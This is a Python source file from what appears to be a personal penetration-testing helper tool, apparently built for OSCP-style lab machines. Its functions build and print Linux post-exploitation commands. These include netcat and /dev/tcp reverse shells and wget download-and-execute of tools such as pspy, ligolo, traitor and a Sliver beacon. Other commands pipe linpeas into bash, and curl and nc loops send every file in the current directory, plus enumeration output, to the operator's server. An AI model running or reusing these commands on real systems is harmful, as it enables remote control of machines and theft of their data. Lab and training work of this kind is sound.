"""
All commands prefixed with "lin"
"""

import hh.utils
from config import cfg
import shutil
from hh.tools import ThirdPartyTool, Tpspy, Tlinenum, Tlin_ligolo_agent, Ttraitor, Tlinpeas, Tlin_pillage_stage1
import os
import log


def lin_shell(port='4444'):
    cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f'.format(hh.utils.get_ip(), port)
    cmd2 = '/bin/bash -i >& /dev/tcp/{}/{} 0>&1'.format(hh.utils.get_ip(), port)
    hh.utils.pandc(cmd)
    hh.utils.pandc(cmd2)
    print(f'nc -lvnp {port}')


def lin_pspy():
    target_file_name = f'/dev/shm/{Tpspy.file_name}'
    cmd = cfg.TEMPLATE_WGET_DOWNLOAD_AND_EXEC.format(Tpspy.url, target_file_name, target_file_name, target_file_name)
    hh.utils.pandc(cmd)


def lin_enum():
    """my own enum script"""

    # exfil file from tee /tmp/enum-$(whoami)-$(hostname)'
    cmd = cfg.TMEPLATE_WEG_TO_BASH_TEE.format(Tlinenum.url)

    # exfil
    cmd2 = f';curl -F "file=@/tmp/enum-$(whoami)-$(hostname)" "{hh.utils.get_web()}upload/generic/$(hostname)"'

    # are { } needed?
    # { echo -ne "POST /upload/nc/$(hostname) HTTP/1.1\r\nHost: HH_IP:HH_PORT\r\nContent-Length: $(wc -c < $1)\r\nX-FILE-NAME: $1\r\n\r\n";   cat $1; } | nc HH_IP HH_PORT
    hh.utils.pandc(cmd + cmd2)


def lin_shell(port=9001):
    cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f'.format(hh.utils.get_ip(), port)
    cmd2 = '/bin/bash -i >& /dev/tcp/{}/{} 0>&1'.format(hh.utils.get_ip(), port)
    hh.utils.pandc(cmd)
    hh.utils.pandc(cmd2)
    print(f'nc -lvnp {port}')


def lin_beacon():
    # we expect the beacon to be already generated
    beacon = f'beacon_{hh.utils.get_ip()}_{cfg.SLIVER_MTLS_PORT}.elf'
    beacon_remote = '/dev/shm/' + beacon
    elf_pwd_path = os.path.join(os.getcwd(), beacon)
    dist = os.path.join(hh.utils.get_hh_folder(), 'app', 'dist')
    elf_dist = os.path.join(dist, beacon)

    if os.path.exists(elf_dist):
        os.remove(elf_dist)

    if not os.path.exists(elf_pwd_path):
        log.critical('Beacon does not exist, generate it first with')

        sliver_lin_beacon = f'generate beacon --os linux --arch amd64 --format ELF --mtls {hh.utils.get_ip()}:{cfg.SLIVER_MTLS_PORT} --save {elf_pwd_path} -G --seconds 5 --skip-symbols'
        hh.utils.pandc(sliver_lin_beacon)
        return

    shutil.copy(elf_pwd_path, elf_dist)
    Tbeacon = ThirdPartyTool('beacon', beacon)

    # send to background
    cmd = cfg.TEMPLATE_WGET_DOWNLOAD_AND_EXEC.format(Tbeacon.url, beacon_remote, beacon_remote, beacon_remote) + '&'
    hh.utils.pandc(cmd)


def lin_ligolo():
    hh.utils.ligolo_server_help()
    name = f'/dev/shm/{Tlin_ligolo_agent.file_name}'
    connect_string = name + f' -connect {hh.utils.get_ip()}:11601 -ignore-cert'
    cmd = cfg.TEMPLATE_WGET_DOWNLOAD_AND_EXEC.format(Tlin_ligolo_agent.url, name, name, connect_string)

    hh.utils.pandc(cmd)
    print(connect_string)


def lin_traitor():
    name = f'/dev/shm/{Ttraitor.file_name}'
    cmd = cfg.TEMPLATE_WGET_DOWNLOAD_AND_EXEC.format(Ttraitor.url, name, name, name)
    hh.utils.pandc(cmd)


def lin_peas():
    cmd = cfg.TEMPLATE_WGET_TO_BASH.format(Tlinpeas.url)
    hh.utils.pandc(cmd)


def lin_pillage():
    """
    Exfiltrates some data
    """
    stage1 = ThirdPartyTool('Pillage.sh', 'Pillage.sh')

    if os.path.exists(stage1.fullpath):
        os.remove(stage1.fullpath)

    with open(stage1.fullpath, 'w') as stage1f:
        with open(Tlin_pillage_stage1.fullpath, 'r') as stage1ftemplate:
            template = stage1ftemplate.read()

        output = template.replace('HH_IP', hh.utils.get_ip()).replace('HH_PORT', str(cfg.PORT))
        stage1f.write(output)
        # stage1f.write('Pillage {}'.format(hh.utils.get_web()))

    cmd = cfg.TEMPLATE_WGET_TO_BASH.format(stage1.url)
    hh.utils.pandc(cmd)


def lin_download():
    """
    Will generate a command to exfiltrate all files in the current working directory
    """

    nc_upload = r"""function UploadToHH {
{ echo -ne "POST /upload/nc/$(hostname) HTTP/1.1\r\nHost: HH_IP:HH_PORT\r\nContent-Length: $(wc -c < $1)\r\nX-FILE-NAME: $1\r\n\r\n";   cat $1; } | nc HH_IP HH_PORT
}"""
    nc_upload = nc_upload.replace('HH_IP', hh.utils.get_ip()).replace('HH_PORT', str(cfg.PORT))

    upload_curl = f"""for i in $(find . -maxdepth 1 -type f -printf '%f\\n'); do curl -F "file=@$i" "{hh.utils.get_web()}upload/generic/$(hostname)"; done """
    upload_nc = f"""for i in $(find . -maxdepth 1 -type f -printf '%f\\n'); do UploadToHH $i; done"""
    print(nc_upload + '\n' + upload_nc)

    print('[+] Alternative with cURL')
    hh.utils.pandc(upload_curl)


def lin_local():
    """
    shorthand to type local.txt hostname ipconfig
    """
    cmd = 'cat local.txt && whoami && hostname && ip a'
    hh.utils.pandc(cmd)


def lin_proof():
    """
    shorthand to type local.txt hostname ipconfig
    """
    cmd = 'cat /root/proof.txt && whoami && hostname && ip a'
    hh.utils.pandc(cmd)
